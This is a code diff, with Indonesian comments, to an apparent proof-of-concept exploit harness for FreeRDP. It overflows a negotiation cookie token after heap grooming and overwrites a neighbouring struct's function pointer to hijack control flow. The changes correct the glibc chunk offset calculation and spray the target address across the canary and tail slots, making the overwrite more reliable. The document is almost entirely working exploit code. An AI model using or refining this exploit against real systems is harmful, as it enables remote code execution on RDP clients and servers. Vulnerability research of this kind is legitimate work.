@@ -39,9 +39,14 @@
 /* Alamat target harus KANONIK: alamat non-kanonik membuat CPU melempar #GP, dan kernel melaporkan
  * si_addr = 0 (bukan nilai kita) sehingga bukti "pc = pilihan penyerang" jadi kabur. */
 #define TARGET_ADDR 0x0000414141414141ULL
-/* offset di dalam token yang mendarat di field `fn` korban:
- * payload A (512) + header chunk B (16) + canary (8) = 536 */
-#define FN_OFFSET 536
+/* Offset di dalam token yang mendarat di field `fn` korban.
+ * Hitungannya (glibc): chunk A = 528 byte total, payload A = chunk+16, dan USABLE-nya 520
+ * (8 byte berikutnya dihitung milik chunk ini). Jadi penulisan 600 byte masih "milik" A sampai 519,
+ * lalu spill mulai token[520] → A+520..535 = header chunk B → B[0] ← token[536] → B->fn ← token[544].
+ * (Verifikasi empiris: dengan target di 536, `fn` tetap 0x41… — persis pergeseran 8 ini.) */
+#define FN_ROFF 544
+#define CANARY_ROFF 536
+#define TAIL_ROFF 552
 
 typedef struct
 {
@@ -103,9 +108,12 @@ int main(void)
 		return 3;
 	memset(token, 0x41, TOKEN_LEN); /* pola yang akan menimpa tetangga */
 	memcpy(token, "Cookie: mstshash=poc\r\n", 22);
-	/* alamat target kanonik ditempatkan tepat di field `fn` korban (token[536..543]) */
+	/* alamat target kanonik ditempatkan tepat di field `fn` korban (+ sabuk di canary & tail,
+	 * supaya pergeseran layout kecil pun tetap tertutup) */
 	const unsigned long long target = TARGET_ADDR;
-	memcpy(token + FN_OFFSET, &target, sizeof(target));
+	memcpy(token + FN_ROFF, &target, sizeof(target));
+	memcpy(token + CANARY_ROFF, &target, sizeof(target));
+	memcpy(token + TAIL_ROFF, &target, sizeof(target));
 
 	freerdp* instance = freerdp_new();
 	if (!instance)
@@ -160,7 +168,8 @@ int main(void)
 	g_victim = B;
 
 	printf("harness rantai — overflow nego → control-flow hijack\n");
-	printf("  target kanonik=0x%016llx dipasang di token[%d] (kanonik: %s)\n", TARGET_ADDR, FN_OFFSET,
+	printf("  target kanonik=0x%016llx di token[%d] (canary %d, tail %d; kanonik: %s)\n", TARGET_ADDR,
+	       FN_ROFF, CANARY_ROFF, TAIL_ROFF,
 	       ((TARGET_ADDR >> 47) == 0 || (TARGET_ADDR >> 47) == 0x1FFFF) ? "ya" : "TIDAK");
 	printf("  grooming: pasangan #%d A=%p B=%p selisih=%ld (payload + header = %d)\n", found, (void*)A,
 	       (void*)B, (long)((unsigned char*)B - A), STREAM_CHUNK + CHUNK_HDR);
